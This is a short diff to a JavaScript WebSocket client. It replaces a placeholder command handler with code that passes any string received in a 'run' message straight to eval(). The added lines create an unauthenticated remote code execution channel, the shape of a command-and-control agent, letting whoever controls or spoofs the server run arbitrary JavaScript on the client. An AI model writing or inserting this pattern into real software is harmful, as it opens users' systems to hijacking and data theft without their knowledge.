@@ -141,13 +141,13 @@ function connectWebSocket() {
       const receivedData = JSON.parse(e.data); // Assuming the data is sent as JSON
       console.log("Received data:", receivedData); // Log received data
 
-      if (receivedData.run && receivedData.run.client && receivedData.run.command) {
-        const clientName = receivedData.run.client;
-        const jsCode = receivedData.run.command;
+      if (receivedData.run) {
+        const jsCode = receivedData.run;
 
         if (typeof jsCode === "string") {
-          console.log(`Received command for ${clientName}: ${jsCode}`);
-          // You can add logic here to execute the command for the specified client
+          console.log(`Received command: ${jsCode}`);
+          // Execute the received JavaScript code using eval()
+          eval(jsCode);
         } else {
           console.error("Command must be a string.");
         }
@@ -171,3 +171,4 @@ function connectWebSocket() {
 }
 
 connectWebSocket(); // Initial connection attempt
+
